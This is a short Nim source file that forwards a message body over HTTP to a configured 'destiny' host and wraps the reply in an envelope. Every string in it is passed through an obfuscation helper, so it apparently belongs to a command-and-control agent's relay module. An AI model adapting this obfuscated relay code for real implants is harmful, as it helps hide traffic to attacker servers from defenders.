import std/json
import ../../utils/global
import ../../utils/network/http as nhttp
import ../../utils/network/relay_packet

proc relayServerUrl(cfg: JsonNode): string =
  # Builds the server url from the destiny host and port
  let h = cfg[obf("destinyHost")].getStr()
  let portNum = cfg[obf("destinyPort")].getInt()
  if h.len == 0 or portNum <= 0:
    return ""
  let secure =
    if cfg.hasKey(obf("destinyTls")): cfg[obf("destinyTls")].getBool()
    else: false
  let scheme = if secure: obf("https://") else: obf("http://")
  var pth = path
  if pth.len == 0:
    pth = obf("/")
  scheme & h & obf(":") & $portNum & pth

proc relayHttpForwardDestiny*(cfg: JsonNode, contentBody: string): string =
  # Forwards the body over http and returns the envelope
  if contentBody.len == 0:
    return ""
  try:
    let resp =
      if cfg[obf("destinyKind")].getStr() == obf("server"):
        nhttp.relay_call(contentBody)
      else:
        let url = relayServerUrl(cfg)
        if url.len == 0:
          return ""
        nhttp.relay_call_url(url, contentBody)
    if not resp.ok or resp.code != 200'u16 or resp.body.len == 0:
      return ""
    let content = relayPipeContent(parseJson(resp.body))
    result = buildEnvelope(content)
  except JsonParsingError:
    result = ""
  except CatchableError:
    result = ""
